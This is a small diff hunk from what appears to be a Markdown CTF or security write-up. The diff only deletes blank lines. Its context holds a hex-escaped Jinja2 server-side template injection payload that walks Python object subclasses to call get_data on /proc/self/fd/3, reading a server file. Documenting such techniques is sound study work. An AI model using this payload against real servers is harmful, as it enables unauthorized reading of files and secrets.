@@ -586,8 +586,6 @@ print(ssti)
 {{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")}}
 ```
 
-
-
 ![image-20210429132030587](https://tva1.sinaimg.cn/large/008i3skNly1gq0s4s3285j30m208i74u.jpg)
 
 
